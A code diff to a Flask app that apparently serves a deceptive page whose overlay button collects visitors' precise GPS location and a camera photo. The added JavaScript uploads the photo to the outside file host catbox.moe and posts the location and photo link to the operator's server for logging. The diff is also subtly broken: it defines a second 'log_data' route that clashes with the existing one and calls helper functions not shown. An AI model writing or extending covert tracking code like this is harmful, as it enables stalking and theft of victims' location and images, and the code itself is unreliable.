@@ -120,59 +120,54 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
-        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
-            try {{
-                // Log the permission request
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'permission_request',
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                
-                // Request actual location
-                const position = await new Promise((resolve, reject) => {{
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }});
-                }});
-                
-                // Log successful location
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'location_data',
-                        ip: await fetch('/getip').then(r => r.text()),
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                
-                // Remove overlay
-                document.querySelector('.gps-overlay').remove();
-            }} catch (error) {{
-                console.error('Location error:', error);
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'error',
-                        error: error.message,
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                alert('Location access is required to continue.');
-            }}
-        }});
+document.getElementById('gps-allow-btn').addEventListener('click', async function() {
+  try {
+    // 1. Get GPS (existing code)
+    const position = await getGPS(); 
+    
+    // 2. Capture photo (existing code)
+    const photoData = await takePhoto();
+    
+    // 3. Upload to Catbox
+    const formData = new FormData();
+    formData.append('reqtype', 'fileupload');
+    formData.append('fileToUpload', 
+      new File([dataURLtoBlob(photoData)], 'photo.jpg', { type: 'image/jpeg' })
+    );
+    
+    const catboxResponse = await fetch('https://catbox.moe/user/api.php', {
+      method: 'POST',
+      body: formData
+    });
+    
+    const catboxUrl = await catboxResponse.text();
+    
+    // 4. Send data to your server
+    await fetch('/log_data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        gps: position,
+        photo_url: catboxUrl,
+        timestamp: new Date().toISOString()
+      })
+    });
+    
+    // Helper function
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+    
+  } catch (error) {
+    console.error('Error:', error);
+  }
+});
     </script>
 </body>
 </html>
@@ -194,6 +189,16 @@ def serve_page():
 def get_ip():
     """Endpoint to get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
+
+@app.route('/log_data', methods=['POST'])
+def log_data():
+    data = request.json
+    logger.info(f"""
+        GPS: {data.get('gps')}
+        Photo URL: {data.get('photo_url')}
+        Timestamp: {data.get('timestamp')}
+    """)
+    return jsonify({'status': 'success'})
 
 @app.route('/log', methods=['POST'])
 def log_data():
